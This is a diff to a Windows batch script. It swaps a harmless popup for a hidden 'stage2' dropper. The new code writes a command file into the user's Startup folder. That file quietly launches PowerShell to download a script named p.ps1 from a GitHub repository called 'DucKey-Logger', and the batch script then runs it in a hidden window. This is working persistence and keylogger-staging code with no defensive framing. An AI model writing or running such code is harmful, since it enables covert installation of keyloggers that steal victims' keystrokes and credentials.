@@ -3,14 +3,23 @@
 REM Save the current directory
 set "initialPath=%cd%"
 
-REM Change to the target directory
-cd /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+REM Define the startup path
+set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
-REM Create the popup.vbs file
-(echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title")> popup.vbs
+REM Change to the startup directory
+cd /d "%startup%"
+
+REM Create the stage2.cmd file
+(
+echo powershell -c "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList 'Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/main/p.ps1\" -OutFile \"p.ps1\"'"
+) > wget.cmd
+
+timeout /t 5 /nobreak > nul
+
+REM Run the stage2.cmd script
+powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"
 
 REM Go back to the initial directory
 cd /d "%initialPath%"
-del initial.cmd
-REM Optionally, display the current directory to verify the change
-echo Current directory is now %cd%
+
+@REM del initial.cmd
